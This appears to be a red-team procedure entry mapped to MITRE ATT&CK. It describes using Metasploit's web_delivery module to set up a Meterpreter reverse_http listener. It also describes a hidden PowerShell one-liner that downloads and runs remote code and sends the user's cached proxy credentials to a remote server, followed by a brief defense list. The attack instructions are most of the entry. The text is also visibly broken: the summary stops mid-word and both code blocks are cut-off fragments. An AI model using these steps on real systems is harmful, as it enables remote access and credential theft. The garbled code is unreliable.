---
id: 5cc688e5-082d-4b73-ada1-11b68bdca7f6
name: Web Delivery and Proxy Credential Stealing
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.344436+00:00'
updated_at: '2023-04-10T20:25:00.358824+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
tags:
- '[[Metasploit]]'
- '[[Meterpreter - Basic]]'
- '[[Meterpreter Webdelivery]]'
---

# Web Delivery and Proxy Credential Stealing

## Summary

This procedure involves using Metasploit's Meterpreter Webdelivery module to deliver a payload via a PowerShell command. The delivered payload is a Meterpreter session that provides the attacker with remote access to the target system. Additionally, the Proxy Credential Stealer command is used to s

## Description

# Description

This procedure involves using Metasploit's Meterpreter Webdelivery module to deliver a payload via a PowerShell command. The delivered payload is a Meterpreter session that provides the attacker with remote access to the target system. Additionally, the Proxy Credential Stealer command is used to steal credentials from the target system's proxy settings, which can be used to pivot to other systems on the network. This technique is commonly used by attackers to gain a foothold in a target network.

## Requirements

1. Access to a system with Metasploit installed

1. Knowledge of the target system's proxy settings

## Defense

1. Implement network segmentation to limit lateral movement

1. Monitor for unusual PowerShell commands and proxy credential theft

1. Use strong and unique passwords for proxy credentials

## Objectives

1. Deliver a Meterpreter payload to the target system

1. Steal proxy credentials from the target system

# Instructions

1. To set up a Powershell web delivery listener, run the following commands:

**Code**: [[use exploit/multi/script/web_delivery
set TARGET 2]]

> 1. use exploit/multi/script/web_delivery - This command selects the script/web_delivery exploit module.
2. set TARGET 2 - This command sets the target to Windows.
3. set payload windows/x64/meterpreter/reverse_http - This command sets the payload to a 64-bit Windows Meterpreter reverse HTTP shell.
4. set LHOST 10.0.0.1 - This command sets the local host address to 10.0.0.1.
5. set LPORT 4444 - This command sets the local port to 4444.
6. run - This command executes the exploit and sets up a Powershell web delivery listener on port 8080.

2. This command steals the proxy credentials of the current user and sends them to a remote server.

**Code**: [[powershell.exe -nop -w hidden -c $g=new-object net]]

> The command uses PowerShell to create a new web client object and sets the system's web proxy as its proxy. It then sets the proxy credentials to the default credentials stored in the user's credential cache. Finally, it executes the code downloaded from the specified URL, which sends the stolen credentials to a remote server. This command can be used by threat actors to gain access to sensitive information such as usernames and passwords.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote File Copy|T1105 - Remote File Copy]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]

## Tags

- [[Metasploit]]
- [[Meterpreter - Basic]]
- [[Meterpreter Webdelivery]]
